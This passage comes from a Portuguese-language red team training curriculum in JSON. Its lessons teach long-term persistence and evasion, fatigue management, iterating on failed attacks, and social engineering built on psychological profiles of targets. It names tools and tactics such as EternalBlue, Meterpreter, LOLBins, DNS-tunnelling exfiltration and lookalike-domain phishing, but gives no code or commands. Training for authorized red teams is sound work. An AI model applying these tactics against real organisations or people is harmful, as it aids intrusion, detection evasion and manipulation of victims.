                                  "title": "Monitorar e iterar persistência por período estendido",
                                  "subSteps": [
                                    "Executar monitoramento passivo por 48-72 horas com beacons low-volume.",
                                    "Iterar adaptações baseadas em logs: mudar C2 ports, IPs, ou técnicas se detecção simulada.",
                                    "Coleta dados: screenshots, logs de comandos, métricas de uptime.",
                                    "Simular fadiga: pausas longas e reconexões para testar paciência.",
                                    "Preparar cleanup: scripts para remoção de artefatos."
                                  ],
                                  "verification": "Persistência intacta por período definido; documentação completa de iterações.",
                                  "estimatedTime": "48-72 horas (monitoramento passivo)",
                                  "materials": "Scripts de automação (Python para logging), timer tools.",
                                  "tips": "Automatize relatórios diários para manter paciência estratégica.",
                                  "learningObjective": "Desenvolver mindset paciente para operações longas com iterações.",
                                  "commonMistakes": "Intervenção prematura; falha em documentar mudanças."
                                }
                              ],
                              "practicalExample": "Em um lab com VM Windows AD e Linux pivot, ganhe shell via EternalBlue, implante Meterpreter service para persistência, pivote via SSH tunnel para DC, evada Sysmon com LOLBins por 72h, iterando beacons para evitar detecção simulada.",
                              "finalVerifications": [
                                "Acesso mantido por 72 horas consecutivas sem interrupção.",
                                "Pivoting para pelo menos 2 hosts adicionais realizado.",
                                "Nenhum artefato detectado em scans EDR simulados.",
                                "Logs de iterações documentados com adaptações.",
                                "Cleanup completo sem vestígios pós-teste.",
                                "Relatório com métricas de stealth e uptime."
                              ],
                              "assessmentCriteria": [
                                "Stealth: Ausência de alertas em logs (90%+ sucesso).",
                                "Eficiência: Tempo médio de reconexão <5min pós-disrupção.",
                                "Cobertura: Técnicas de pivoting e evasão variadas (mín. 3).",
                                "Documentação: Relatório detalhado com evidências.",
                                "Paciência: Iterações sem pressa, mantendo operação por prazo.",
                                "Segurança: Lab isolado, sem vazamentos."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Compreensão de tráfego C2 e pivoting TCP/IP.",
                                "Programação: Scripts Python/PowerShell para automação de beacons.",
                                "Psicologia: Mindset de paciência e adaptação adversária.",
                                "Gestão de Projetos: Planejamento de operações longas com milestones."
                              ],
                              "realWorldApplication": "Em engajamentos de Red Team autorizados, testar resiliência de defesas corporativas mantendo acesso stealth durante simulações de APT, identificando gaps em detecção de persistência para melhorar segurança."
                            },
                            "estimatedTime": "5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.2.1.1.2"
                            ]
                          },
                          {
                            "id": "10.1.2.1.2.2",
                            "name": "Gerenciar fadiga mental em operações longas",
                            "description": "Aplicar técnicas psicológicas para manter foco durante simulações de ataques que duram dias, evitando erros por exaustão.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Reconhecer Sinais Precoces de Fadiga Mental",
                                  "subSteps": [
                                    "Monitore sintomas físicos como olhos cansados, dores de cabeça e tensão muscular.",
                                    "Observe indicadores cognitivos como diminuição na velocidade de processamento de logs ou erros simples em comandos.",
                                    "Registre padrões emocionais como irritabilidade ou perda de motivação durante sessões simuladas.",
                                    "Use uma escala subjetiva de fadiga (1-10) a cada 2 horas para autoavaliação.",
                                    "Compare com benchmarks pessoais de desempenho em tarefas rotineiras de cibersegurança."
                                  ],
                                  "verification": "Registre em um log pessoal pelo menos 5 sinais identificados corretamente em uma simulação de 8 horas.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Planilha de autoavaliação de fadiga",
                                    "Vídeos educativos sobre fadiga cognitiva (ex: TED Talks)",
                                    "Timer para intervalos"
                                  ],
                                  "tips": "Integre o monitoramento ao fluxo de trabalho sem interromper a simulação; use apps como Focus@Will para lembretes.",
                                  "learningObjective": "Identificar sinais de fadiga em si mesmo e na equipe com 90% de precisão.",
                                  "commonMistakes": [
                                    "Ignorar sinais sutis achando que são 'normais'",
                                    "Superestimar resistência pessoal",
                                    "Não registrar para análise posterior"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Implementar Micro-Pausas e Rotatividade de Tarefas",
                                  "subSteps": [
                                    "Agende pausas de 5-10 minutos a cada 90 minutos usando técnica Pomodoro adaptada para ops longas.",
                                    "Rotacione tarefas: alternar entre análise de rede, scripting e monitoramento para evitar monotonia.",
                                    "Pratique handover rápido de contexto (menos de 2 minutos) com teammates simulados.",
                                    "Incorpore pausas ativas: alongamentos, caminhadas curtas ou exercícios de respiração.",
                                    "Teste em simulação: execute uma rotação completa sem perda de momentum na operação."
                                  ],
                                  "verification": "Complete uma sessão de 4 horas com pelo menos 3 micro-pausas e zero interrupções na continuidade da simulação.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "App Pomodoro (ex: Focus Booster)",
                                    "Guia de handover de Red Team",
                                    "Espaço para pausas físicas"
                                  ],
                                  "tips": "Personalize intervalos baseado no seu pico de energia circadiano; evite telas durante pausas.",
                                  "learningObjective": "Manter performance estável por 4+ horas através de pausas estruturadas.",
                                  "commonMistakes": [
                                    "Pausas muito longas que quebram fluxo",
                                    "Rotação sem handover claro",
                                    "Ignorar fadiga da equipe"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Aplicar Técnicas Psicológicas de Foco Sustentado",
                                  "subSteps": [
                                    "Pratique mindfulness: 5 minutos de meditação guiada focada em respiração antes de sessões intensas.",
                                    "Use ancoragem cognitiva: defina 'mantras' como 'foco no próximo pivot' para realinhar atenção.",
                                    "Aplique gamificação: divida a simulação em 'missões' com recompensas mentais (ex: café após milestone).",
                                    "Treine visualização: imagine cenários de sucesso sob fadiga para buildar resiliência mental.",
                                    "Integre em simulação: execute uma técnica durante pico de fadiga e meça impacto no erro rate."
                                  ],
                                  "verification": "Demonstre redução de 20% em erros durante uma simulação de 6 horas usando técnicas registradas.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "App de meditação (ex: Headspace)",
                                    "Scripts de mantras personalizados",
                                    "Ferramentas de tracking de erros (ex: Wireshark logs)"
                                  ],
                                  "tips": "Combine com hidratação e snacks proteicos para boost sinérgico.",
                                  "learningObjective": "Dominar 3 técnicas psicológicas para sustentar foco em ops de 24+ horas.",
                                  "commonMistakes": [
                                    "Técnicas genéricas sem adaptação ao contexto cyber",
                                    "Prática isolada sem integração real",
                                    "Desistência precoce por ceticismo"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Planejar Recuperação e Avaliação Pós-Operação",
                                  "subSteps": [
                                    "Defina triggers para handover total: após 24h contínuas ou score de fadiga >7.",
                                    "Planeje sono recuperativo: ciclos de 90 minutos com blackout total de estímulos digitais.",
                                    "Realize debrief: analise logs de fadiga vs performance em 30 minutos pós-simulação.",
                                    "Ajuste plano para próxima iteração baseado em métricas (ex: tempo até primeiro erro).",
                                    "Documente lições em template de Red Team para compartilhamento."
                                  ],
                                  "verification": "Crie e execute um plano de recuperação para uma simulação de 12 horas, com debrief completo.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Template de debrief de fadiga",
                                    "Tracker de sono (ex: Sleep Cycle app)",
                                    "Log de simulação cibernética"
                                  ],
                                  "tips": "Priorize qualidade do sono sobre quantidade; use naps estratégicos.",
                                  "learningObjective": "Integrar recuperação ao ciclo de operações para zero falhas por exaustão.",
                                  "commonMistakes": [
                                    "Pular debrief por exaustão",
                                    "Handover sem validação dupla",
                                    "Não escalar para ops reais"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma simulação de 72 horas de ataque cibernético persistente (ex: emulação de APT contra rede corporativa simulada), o learner identifica fadiga após 20h via logs de erros crescentes, implementa micro-pausas e rotação com um 'teammate' virtual, aplica mindfulness para pivotar para exploração lateral, e handovereia com sucesso, mantendo 95% de uptime sem brechas por erro humano.",
                              "finalVerifications": [
                                "Mantém taxa de erro abaixo de 5% após 24 horas de simulação contínua.",
                                "Identifica e mitiga fadiga em si mesmo e simulações de equipe em tempo real.",
                                "Executa handover fluido em menos de 2 minutos sem perda de contexto operacional.",
                                "Registra e ajusta plano de fadiga baseado em pelo menos 3 simulações.",
                                "Demonstra foco sustentado em tarefas complexas (ex: análise de C2) sob fadiga induzida.",
                                "Avalia recuperação pós-op com métricas quantificáveis (ex: tempo de retorno ao baseline)."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de sinais de fadiga (90%+ acurácia).",
                                "Eficácia das intervenções: redução mensurável em erros durante ops longas.",
                                "Qualidade do planejamento: inclusão de todos elementos (pausas, rotação, recuperação).",
                                "Integração prática: aplicação seamless em simulações cyber sem interrupção.",
                                "Auto-reflexão: lições aprendidas documentadas e acionáveis.",
                                "Resiliência demonstrada: performance estável em múltiplas sessões de 12+ horas."
                              ],
                              "crossCurricularConnections": [
                                "Psicologia Cognitiva: Modelos de atenção sustentada (ex: teoria de recursos limitados).",
                                "Gestão de Projetos: Técnicas de gerenciamento de recursos humanos em sprints longos.",
                                "Educação Física: Impacto do condicionamento aeróbico na endurance mental.",
                                "Neurociência: Efeitos do sono e dopamina na tomada de decisões sob estresse.",
                                "Liderança: Dinâmicas de equipe em ambientes de alta pressão (ex: militares)."
                              ],
                              "realWorldApplication": "Em operações reais de Red Team durante pentests prolongados ou defesas cibernéticas em exercícios como Cyber Storm, onde ataques APT simulam dias de persistência, permitindo que analistas mantenham detecção precisa sem falhas catastróficas por exaustão humana."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.1.2.3",
                            "name": "Adaptar estratégias baseadas em falhas iterativas",
                            "description": "Aprender com tentativas falhas para refinar abordagens, replicando a persistência de adversários em campanhas cibernéticas reais.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Analisar a Falha Inicial",
                                  "subSteps": [
                                    "Registre todos os detalhes do teste ou simulação que falhou, incluindo ações tomadas, ambiente e resultados observados.",
                                    "Colete evidências como logs, screenshots ou gravações da tentativa.",
                                    "Categorize a falha: técnica (ex: bypass falhou), operacional (ex: detecção precoce) ou estratégica (ex: alvo errado).",
                                    "Documente o impacto: o que foi detectado e por quê.",
                                    "Compare com objetivos iniciais para quantificar o desvio."
                                  ],
                                  "verification": "Checklist completo preenchido com evidências anexadas e análise categorizada.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Ferramentas de logging (ex: Wireshark, ELK Stack)",
                                    "Notebook ou ferramenta de documentação (ex: Notion, Markdown)"
                                  ],
                                  "tips": "Seja objetivo e evite culpar fatores externos; foque em fatos observáveis.",
                                  "learningObjective": "Desenvolver habilidade de observação imparcial para capturar dados precisos de falhas.",
                                  "commonMistakes": [
                                    "Ignorar detalhes menores que revelam padrões",
                                    "Atribuir falha a 'sorte' em vez de análise",
                                    "Não registrar timestamps exatos"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar Causas Raiz",
                                  "subSteps": [
                                    "Aplique técnica de 5 Whys: pergunte 'por quê?' repetidamente até a causa raiz.",
                                    "Mapeie dependências: o que influenciou a falha (ex: configuração de rede, comportamento do defensor)?",
                                    "Analise padrões de adversários reais via relatórios (ex: MITRE ATT&CK para táticas semelhantes).",
                                    "Priorize causas: alta impacto vs. baixa esforço para corrigir.",
                                    "Valide com simulação rápida ou consulta a frameworks como SWOT."
                                  ],
                                  "verification": "Diagrama de causa-raiz (ex: fishbone) com pelo menos 3 níveis de profundidade e priorização listada.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Templates de 5 Whys ou fishbone diagram (ex: Lucidchart)",
                                    "Relatórios MITRE ATT&CK",
                                    "Acesso a logs da falha"
                                  ],
                                  "tips": "Envolva perspectiva do defensor para simular detecção; pergunte 'como eles me pegaram?'",
                                  "learningObjective": "Aprender a destrinchar falhas complexas em componentes acionáveis.",
                                  "commonMistakes": [
                                    "Parar no primeiro 'por quê' superficial",
                                    "Não considerar interações entre causas",
                                    "Ignorar contexto do adversário real"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Desenvolver Estratégia Ajustada",
                                  "subSteps": [
                                    "Brainstorm 3-5 alternativas baseadas nas causas raiz, inspiradas em táticas persistentes (ex: living off the land).",
                                    "Selecione a melhor via matriz de decisão (risco vs. recompensa).",
                                    "Refine com camadas: primary path + backups para resiliência.",
                                    "Incorpore lições de falhas passadas ou cases históricos (ex: SolarWinds persistence).",
                                    "Escreva plano conciso com triggers para pivot."
                                  ],
                                  "verification": "Plano escrito com alternativas, matriz de decisão e triggers definidos.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "Matriz de decisão template (Excel/Google Sheets)",
                                    "Casos de estudo cibernéticos (ex: Mandiant reports)"
                                  ],
                                  "tips": "Pense como adversário paciente: priorize stealth sobre speed.",
                                  "learningObjective": "Criar estratégias flexíveis que incorporam aprendizado iterativo.",
                                  "commonMistakes": [
                                    "Copiar soluções genéricas sem adaptação",
                                    "Sobrecarregar plano com muitas opções",
                                    "Esquecer backups para cenários de falha"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar e Iterar a Estratégia",
                                  "subSteps": [
                                    "Execute teste controlado da nova estratégia em ambiente simulado.",
                                    "Monitore em tempo real e pause se detectar padrões de falha anterior.",
                                    "Compare métricas pré e pós-ajuste (ex: tempo até detecção).",
                                    "Registre nova falha se ocorrer e retorne ao Step 1.",
                                    "Documente ciclo completo para portfolio de iterações."
                                  ],
                                  "verification": "Relatório de teste com métricas comparativas e lições documentadas.",
                                  "estimatedTime": "90 minutos",
                                  "materials": [
                                    "Ambiente de simulação (ex: TryHackMe, custom lab com VMs)",
                                    "Ferramentas de monitoramento (ex: Splunk free)"
                                  ],
                                  "tips": "Limite ciclos a 3 iterações por sessão para evitar fadiga.",
                                  "learningObjective": "Fechar o loop iterativo com testes validados.",
                                  "commonMistakes": [
                                    "Testar em ambiente não idêntico",
                                    "Não medir quantitativamente",
                                    "Abandonar após sucesso parcial"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um jogo de guerra cibernética simulando APT28, a primeira tentativa de phishing falha por filtro de email. Analise logs (Step 1), identifique causa raiz como assinatura de domínio (Step 2), ajuste para spear-phishing com domínio lookalike (Step 3), teste em lab e meça taxa de cliques de 5% para 25% (Step 4).",
                              "finalVerifications": [
                                "Explicar verbalmente o ciclo completo de uma falha real ou simulada.",
                                "Produzir diagrama de causa-raiz para uma falha recente.",
                                "Demonstrar plano ajustado que aborda 80% das causas identificadas.",
                                "Executar 2 iterações em lab com melhoria mensurável.",
                                "Identificar tática MITRE ATT&CK equivalente à estratégia final.",
                                "Discutir como persistência adversária se aplica ao caso."
                              ],
                              "assessmentCriteria": [
                                "Profundidade da análise de falha (níveis de causa raiz).",
                                "Criatividade e relevância das estratégias ajustadas.",
                                "Precisão das verificações e métricas quantitativas.",
                                "Integração de mindset adversário (persistência, stealth).",
                                "Documentação clara e acionável.",
                                "Capacidade de iterar independentemente sem orientação."
                              ],
                              "crossCurricularConnections": [
                                "Análise de Dados: Uso de logs e métricas para patterns.",
                                "Psicologia: Comportamento humano em detecção de falhas.",
                                "Programação: Scripts para automação de testes iterativos.",
                                "Gestão de Projetos: Ciclos Agile/Scrum em Red Teaming."
                              ],
                              "realWorldApplication": "Adversários como Lazarus Group iteram falhas em campanhas bancárias, ajustando malwares após detecções (ex: WannaCry pivôs), permitindo brechas persistentes em bancos globais por meses."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.2.1.2.1"
                            ]
                          }
                        ]
                      },
                      {
                        "id": "10.1.2.1.3",
                        "name": "Criatividade e Inovação Psicológica",
                        "description": "Explorar abordagens não ortodoxas e pensamento fora da caixa para superar defesas, refletindo a inovação imprevisível dos atacantes.",
                        "specificSkills": [
                          {
                            "id": "10.1.2.1.3.1",
                            "name": "Gerar ideias de ataques laterais e criativos",
                            "description": "Utilizar brainstorming psicológico para inventar vetores de ataque inovadores, como engenharia social combinada com exploits técnicos.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Pesquisa e Mapeamento Psicológico do Alvo",
                                  "subSteps": [
                                    "Identifique o perfil dos usuários-alvo: cargos, hábitos diários e vulnerabilidades emocionais comuns.",
                                    "Colete dados públicos sobre a organização: estrutura, cultura e eventos recentes.",
                                    "Crie personas psicológicas baseadas em traços como confiança excessiva, pressa ou medo de autoridade.",
                                    "Mapeie motivadores humanos: ganância, curiosidade, urgência ou solidariedade.",
                                    "Documente fraquezas comportamentais observáveis em redes sociais ou relatórios públicos."
                                  ],
                                  "verification": "Mapa psicológico completo com pelo menos 3 personas detalhadas e 5 motivadores listados.",
                                  "estimatedTime": "2-3 horas",
                                  "materials": "Ferramentas OSINT (Maltego, Shodan), redes sociais, relatórios anuais da empresa.",
                                  "tips": "Foquem em empatia: pense como o alvo reagiria emocionalmente.",
                                  "learningObjective": "Desenvolver compreensão profunda dos drivers psicológicos humanos para explorar fraquezas.",
                                  "commonMistakes": "Ignorar dados culturais ou regionais, levando a perfis genéricos e ineficazes."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Brainstorming Livre de Ideias Laterais Psicológicas",
                                  "subSteps": [
                                    "Realize sessão de brainstorming sem julgamentos: liste 20+ ideias malucas baseadas em psicologia.",
                                    "Use técnicas como 'pensar ao contrário' (o que o alvo NÃO espera?) ou analogias de vida real.",
                                    "Incorpore vieses cognitivos: explore anchoring, scarcity ou social proof.",
                                    "Gere variações: de phishing criativo a pretextos inesperados.",
                                    "Registre todas as ideias em um quadro visual sem filtros iniciais."
                                  ],
                                  "verification": "Lista inicial de pelo menos 20 ideias brutas, categorizadas por tipo psicológico.",
                                  "estimatedTime": "1-2 horas",
                                  "materials": "Quadro branco digital (Miro, Jamboard), timer para sessões de 10 minutos.",
                                  "tips": "Quantidade antes de qualidade: evite auto-censura nas primeiras rodadas.",
                                  "learningObjective": "Praticar geração criativa de vetores de ataque focados em manipulação psicológica.",
                                  "commonMistakes": "Ficar preso em ideias convencionais, limitando a lateralidade."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Integração de Engenharia Social com Exploits Técnicos",
                                  "subSteps": [
                                    "Selecione as top 10 ideias psicológicas e combine com exploits conhecidos (ex: USB drop + pretextos).",
                                    "Avalie compatibilidades: como um email de 'urgência' leva a um payload malicioso?",
                                    "Crie cenários híbridos: engenharia social para bypass de MFA + exploit de zero-day.",
                                    "Teste logicamente: simule o fluxo do ataque em um diagrama.",
                                    "Identifique pontos de falha técnicos e ajuste o gancho social."
                                  ],
                                  "verification": "5+ vetores híbridos documentados com fluxogramas e justificativas psicológicas.",
                                  "estimatedTime": "2 horas",
                                  "materials": "Ferramentas de diagramação (Draw.io), bases de exploits (Exploit-DB, CVE).",
                                  "tips": "Comece pelo social: a técnica só funciona se o humano cair primeiro.",
                                  "learningObjective": "Habilitar fusão inovadora de táticas sociais e técnicas para vetores imprevisíveis.",
                                  "commonMistakes": "Sobrecarregar com técnica complexa sem base social forte."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Avaliação, Refinamento e Priorização de Ideias",
                                  "subSteps": [
                                    "Pontue ideias por originalidade, viabilidade, impacto e detecção (escala 1-10).",
                                    "Elimine redundâncias e refine as top 3 com iterações.",
                                    "Simule cenários em papel ou ferramenta low-fi para validar fluxo.",
                                    "Adicione camadas de evasão: como tornar o ataque menos detectável?",
                                    "Documente o processo final com prós, contras e plano de execução."
                                  ],
                                  "verification": "Relatório final com 3-5 vetores priorizados, scores e refinamentos aplicados.",
                                  "estimatedTime": "1 hora",
                                  "materials": "Planilha de scoring (Google Sheets), simulador de ataques (Atomic Red Team).",
                                  "tips": "Use matriz Eisenhower para priorizar: impacto alto vs. esforço baixo.",
                                  "learningObjective": "Aprender a filtrar e polir ideias criativas para aplicação prática em red team.",
                                  "commonMistakes": "Não quantificar: priorização subjetiva leva a escolhas ruins."
                                }
                              ],
                              "practicalExample": "Em um jogo de guerra cibernética contra uma empresa de finanças, gere ideias como: enviar um 'pacote perdido' via drone com USB infectado, pretextando ser de um fornecedor confiável (explorando confiança e curiosidade), levando a execução de payload que explora CVE-2023-1234 em software interno.",
                              "finalVerifications": [
                                "Pelo menos 5 vetores de ataque laterais únicos e documentados.",
                                "Cada ideia combina elementos psicológicos com técnicos de forma inovadora.",
                                "Todas as ideias foram avaliadas por viabilidade e originalidade.",
                                "Processo de brainstorming registrado com timestamps e iterações.",
                                "Verificação de que nenhuma ideia é copiada de fontes públicas sem adaptação criativa.",
                                "Simulação low-fi confirma fluxo lógico sem gaps."
                              ],
                              "assessmentCriteria": [
                                "Originalidade: Ideias fogem de táticas padrão (80%+ score).",
                                "Lateralidade: Ataques usam ângulos não óbvios (ex: não só phishing básico).",
                                "Integração híbrida: Psicologia + técnica coesa e viável.",
                                "Documentação: Completa, com fluxos e justificativas claras.",
                                "Criatividade mensurável: Número de ideias geradas vs. refinadas.",
                                "Alinhamento com contexto: Adaptado ao alvo específico."
                              ],
                              "crossCurricularConnections": [
                                "Psicologia Cognitiva: Aplicação de vieses e heurísticas humanas.",
                                "Design Thinking: Brainstorming e prototipagem de cenários de ataque.",
                                "Inteligência Artificial: Uso de LLMs para auxiliar geração de ideias iniciais.",
                                "Gestão de Projetos Ágeis: Iteração rápida e priorização em sprints.",
                                "Ética e Filosofia: Considerações morais em simulações de adversário."
                              ],
                              "realWorldApplication": "Em operações de Red Team reais, como as realizadas pela Mandiant ou em CTFs avançados (ex: DEF CON), essa habilidade permite bypass de defesas automatizadas, como EDRs, ao explorar o 'fator humano' de forma imprevisível, resultando em breaches simulados mais realistas e treinamentos eficazes para Blue Teams."
                            },
                            "estimatedTime": "4 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.2.1.1.1"
                            ]
                          },
                          {
                            "id": "10.1.2.1.3.2",
                            "name": "Quebrar padrões de pensamento defensivo",
                            "description": "Treinar para desafiar assunções de segurança convencional, adotando o mindset caótico e adaptável do adversário cibernético.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Identificar Padrões de Pensamento Defensivo Comuns",
                                  "subSteps": [
                                    "Liste assunções defensivas típicas em segurança cibernética, como 'firewalls bloqueiam tudo' ou 'usuários seguem protocolos'.",
                                    "Analise relatórios de incidentes reais (ex: breaches da Equifax ou SolarWinds) para mapear onde esses padrões falharam.",
                                    "Crie um mapa mental com 10+ padrões defensivos categorizados por camada (rede, aplicação, humana).",
                                    "Discuta em grupo ou auto-reflita: como esses padrões limitam a visão de ameaças emergentes?",
                                    "Documente em um diário pessoal os padrões mais prevalentes no seu contexto atual."
                                  ],
                                  "verification": "Mapa mental completo com pelo menos 10 padrões identificados e exemplos de falhas associados.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Relatórios de breaches (MITRE ATT&CK, Verizon DBIR)",
                                    "Ferramenta de mind mapping (ex: XMind, Miro)",
                                    "Notebook ou diário digital"
                                  ],
                                  "tips": "Comece com assunções pessoais antes de generalizar; use cores para categorizar (vermelho para crítico).",
                                  "learningObjective": "Reconhecer e catalogar vieses defensivos que criam pontos cegos em defesas cibernéticas.",
                                  "commonMistakes": [
                                    "Focar apenas em falhas técnicas, ignorando humanas.",
                                    "Listar padrões superficiais sem exemplos reais.",
                                    "Não personalizar para o contexto organizacional."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Estudar o Mindset Caótico do Adversário Cibernético",
                                  "subSteps": [
                                    "Leia casos de estudo de APTs (ex: APT28, Lazarus Group) focando em táticas não convencionais e adaptações rápidas.",
                                    "Assista vídeos ou podcasts sobre red teaming (ex: SANS Red Team Summit) destacando imprevisibilidade.",
                                    "Escreva perfis fictícios de adversários: motivações, recursos limitados e como exploram caos.",
                                    "Compare mindset defensivo vs. ofensivo em uma tabela: rigidez vs. flexibilidade, previsão vs. improvisação.",
                                    "Pratique role-playing: responda a um cenário de defesa como se fosse o atacante."
                                  ],
                                  "verification": "Tabela comparativa completa e 3 perfis de adversários com táticas caóticas descritas.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Documentos MITRE ATT&CK Navigator",
                                    "Vídeos/podcasts de cibersegurança (YouTube: Darknet Diaries)",
                                    "Ferramenta de tabela (Google Sheets ou Excel)"
                                  ],
                                  "tips": "Pense como um hacker com orçamento zero: foque em engenharia social e supply chain.",
                                  "learningObjective": "Internalizar características do mindset adversário: caos controlado, adaptação e exploração de fraquezas humanas.",
                                  "commonMistakes": [
                                    "Copiar táticas sem entender psicologia subjacente.",
                                    "Ignorar adaptações em tempo real dos adversários.",
                                    "Manter viés defensivo na análise."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Praticar Quebra de Padrões com Simulações Caóticas",
                                  "subSteps": [
                                    "Configure um lab simples (ex: TryHackMe ou HackTheBox) com defesas padrão.",
                                    "Desafie-se a atacar ignorando caminhos convencionais: use OBFUSCAÇÃO, living-off-the-land ou ataques laterais inesperados.",
                                    "Registre 5 tentativas falhas e pivôs caóticos adotados para sucesso.",
                                    "Incorpore elementos humanos: simule phishing adaptável ou insider threats.",
                                    "Debriefe: o que o mindset defensivo teria bloqueado?"
                                  ],
                                  "verification": "Log de simulação com 5 pivôs documentados e pelo menos 2 sucessos não convencionais.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Plataformas de lab (TryHackMe, VulnHub)",
                                    "VMs com defesas (Kali Linux, Metasploitable)",
                                    "Ferramenta de logging (Notion ou Jupyter Notebook)"
                                  ],
                                  "tips": "Defina timer para forçar decisões rápidas; priorize criatividade sobre eficiência.",
                                  "learningObjective": "Aplicar mindset caótico para quebrar assunções defensivas em cenários simulados.",
                                  "commonMistakes": [
                                    "Seguir playbooks padrão em vez de improvisar.",
                                    "Parar após primeiro sucesso.",
                                    "Não registrar pivôs mentais."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Refletir, Iterar e Solidificar o Novo Mindset",
                                  "subSteps": [
                                    "Revise logs anteriores: identifique resíduos de pensamento defensivo.",
                                    "Crie exercícios diários: 'Hoje, quebro uma assunção em uma notícia de cibersegurança'.",
                                    "Debata com pares ou mentor: defenda uma tática caótica controversa.",
                                    "Desenvolva um 'mantra adversário' pessoal para recitar antes de análises.",
                                    "Planeje aplicação em próximo exercício de red team."
                                  ],
                                  "verification": "Diário de reflexão com 7 entradas semanais e mantra pessoal definido.",
                                  "estimatedTime": "1 hora inicial + 15 min/dia por 1 semana",
                                  "materials": [
                                    "Diário pessoal",
                                    "Fórum ou grupo de discussão (Discord cibersegurança)",
                                    "Notícias diárias ( Krebs on Security)"
                                  ],
                                  "tips": "Use prompts de journaling: 'O que o adversário faria aqui?' repetidamente.",
                                  "learningObjective": "Consolidar mindset adaptável como hábito duradouro, eliminando padrões defensivos.",
                                  "commonMistakes": [
                                    "Fazer reflexão superficial sem ação.",
                                    "Isolar-se sem feedback externo.",
                                    "Reverter a padrões antigos sob pressão."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um lab de rede corporativa simulada, ao invés de escanear portas padrão (pensamento defensivo), adote caos: finja ser um fornecedor via e-mail spear-phishing adaptável, extraia credenciais via conversa casual, pivote para RDP não monitorado e exfiltre dados via DNS tunneling – quebrando assunção de 'perímetro seguro'.",
                              "finalVerifications": [
                                "Lista 5+ assunções defensivas pessoais quebradas com exemplos.",
                                "Sucesso em simulação caótica sem fallback para táticas padrão.",
                                "Mantra adversário recitado e aplicado em análise real.",
                                "Feedback de pares confirmando mudança de mindset.",
                                "Diário mostra pivôs adaptáveis em 80% das entradas.",
                                "Identifica fraquezas não convencionais em relatório de incidente existente."
                              ],
                              "assessmentCriteria": [
                                "Criatividade na quebra de assunções (nota 1-10).",
                                "Profundidade de adaptação caótica em simulações.",
                                "Evidência de reflexão contínua no diário.",
                                "Capacidade de defender táticas controversas logicamente.",
                                "Integração de mindset em cenários reais ou labs.",
                                "Redução mensurável de vieses defensivos pré/pós."
                              ],
                              "crossCurricularConnections": [
                                "Psicologia Cognitiva: Desafiar vieses de confirmação (Kahneman Thinking Fast/Slow).",
                                "Estratégia Militar: Teoria do Jogo de Guerra (Clausewitz On War).",
                                "Design Thinking: Empatia com 'usuário adversário'.",
                                "Inteligência Artificial: Modelos generativos para cenários caóticos.",
                                "Filosofia: Niilismo prático e imprevisibilidade (Nietzsche)."
                              ],
                              "realWorldApplication": "Em operações de Red Team, permite pentests inovadores que expõem gaps invisíveis a defesas estáticas, como em exercícios da NSA ou CERTs nacionais, onde equipes com mindset caótico detectam 30-50% mais vulnerabilidades que abordagens tradicionais."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.1.3.3",
                            "name": "Integrar psicologia comportamental em táticas",
                            "description": "Aplicar princípios de nudge e manipulação sutil para explorar fraquezas humanas em cenários de red team.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Estudar Princípios Fundamentais de Psicologia Comportamental",
                                  "subSteps": [
                                    "Ler capítulos chave de 'Nudge' de Thaler e Sunstein sobre choice architecture.",
                                    "Identificar e listar 5 vieses cognitivos comuns (ex: anchoring, scarcity, social proof).",
                                    "Assistir vídeos educativos sobre nudge theory aplicada a decisões humanas.",
                                    "Mapear como esses princípios se aplicam a comportamentos online (ex: cliques impulsivos).",
                                    "Criar um glossário pessoal com definições e exemplos cibernéticos."
                                  ],
                                  "verification": "Glossário completo com pelo menos 5 princípios e exemplos validados por auto-quiz.",
                                  "estimatedTime": "4 horas",
                                  "materials": "Livro 'Nudge' (PDF), vídeos TED Talks sobre behavioral economics, caderno de notas.",
                                  "tips": "Use mind maps para conectar vieses a cenários digitais como emails phishing.",
